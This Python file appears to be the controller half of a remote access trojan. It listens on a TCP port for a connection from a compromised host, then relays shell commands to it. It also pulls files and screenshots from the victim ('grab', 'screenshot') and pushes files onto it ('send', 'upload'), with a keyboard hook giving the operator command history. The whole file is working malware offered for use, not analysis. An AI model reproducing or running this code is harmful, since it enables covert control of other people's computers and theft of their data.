import os
import socket
import time
from threading import Thread

from pynput.keyboard import *


class Server(Thread):
    def __init__(self):
        self.controller = Controller()
        self.conn = socket.socket()
        self.conn.bind(("10.0.0.19", 8080))
        self.conn.listen(1)
        print('[+] Listening for income TCP connection on port 8080')
        self.conn, addr = self.conn.accept()
        print('[+]We got a connection from', addr)
        self.cwd = self.conn.recv(1024).decode('ISO-8859-1')
        self.commands = []
        self.ind = 0

        th = Thread(target=self.key_event)
        th.start()

    def download(self, command):
        self.conn.send(command.encode('ISO-8859-1'))
        if command != 'screenshot':
            _, path = command.split("*")
        else:
            path = os.path.abspath('screenshots') + time.asctime()[4:8] + time.asctime()[
                                                                          8:10] + "-" + time.asctime()[
                                                                                        20:] + "-" + time.asctime()[
                                                                                                     11:19].replace(
                ':', '-') + ".jpg"
        f = open(path, 'wb')
        while True:
            bits = self.conn.recv(1024)
            if bits.endswith('DONE'.encode('ISO-8859-1')):
                f.write(bits[:-4])
                f.close()
                print('[+] Transfer completed ')
                break
            if 'File not found'.encode('ISO-8859-1') in bits:
                print('[-] Unable to find the file')
                break
            f.write(bits)

    def upload(self, command):
        self.conn.send(command.encode('ISO-8859-1'))
        send, command = command.split("*")
        if os.path.isfile(command):
            print(os.path.exists(command))
            f = open(command, 'rb')
            packet = f.read(1024)
            while len(packet) > 0:
                self.conn.send(packet)
                packet = f.read(1024)
            self.conn.send('DONE'.encode('ISO-8859-1'))
            print('[+] Transfer completed!')
        else:
            self.conn.send('File not found'.encode('ISO-8859-1'))

    def run(self):
        while True:
            command = input(self.cwd + ' ')
            self.SaveObject(command)
            if 'cd' in command:
                self.conn.send(command.encode('ISO-8859-1'))
                res = self.conn.recv(1024).decode('ISO-8859-1')
                if '[+]' in res:
                    self.cwd = res[11:]
            elif 'terminate' in command:
                self.conn.send('terminate'.encode('ISO-8859-1'))
                self.__init__()
            elif 'grab' in command:
                self.download(command)
            elif 'screenshot' in command:
                self.download(command)
            elif 'send' in command or 'upload' in command:
                try:
                    self.upload(command)
                except Exception as e:
                    print(e)
            elif command == '':
                continue
            else:
                try:
                    self.conn.send(command.encode('ISO-8859-1'))
                    print(self.conn.recv(40960).decode('ISO-8859-1'))
                except ConnectionResetError:
                    self.__init__()

    def on_press(self, key):
        if key == Key.up:
            for i in range(30):
                self.controller.press(Key.backspace)
                self.controller.release(Key.backspace)
            for char in self.Back():
                self.controller.press(char)
                self.controller.release(char)
        elif key == Key.down:
            for i in range(30):
                self.controller.press(Key.backspace)
                self.controller.release(Key.backspace)
            for char in self.Forward():
                self.controller.press(char)
                self.controller.release(char)

    def Back(self):
        """Up arrow has been pressed"""
        # self.commands: ['dir', 'ipconfig', 'cd ..']
        try:
            self.ind -= 1
            if self.ind >= 0:
                return self.commands[self.ind]
            else:
                self.ind += 1
                return self.commands[self.ind]
        except IndexError:
            return ''

    def SaveObject(self, obj: ...):
        """
        Appends a command to the list
        """
        self.commands.append(obj) if obj not in self.commands else None
        self.ind = self.commands.index(obj)
        if obj in self.commands:  # If I pressed a command which I already executed bring it to the first place.
            self.commands.remove(obj)
            self.commands.insert(1, obj)

    def Forward(self) -> str:
        """
        Down arrow has been pressed.
        """
        try:
            self.ind += 1
            return self.commands[self.ind]
        except IndexError:
            return ''

    def key_event(self):
        with Listener(on_press=self.on_press) as l:
            l.join()


def main():
    server = Server()
    server.run()


main()
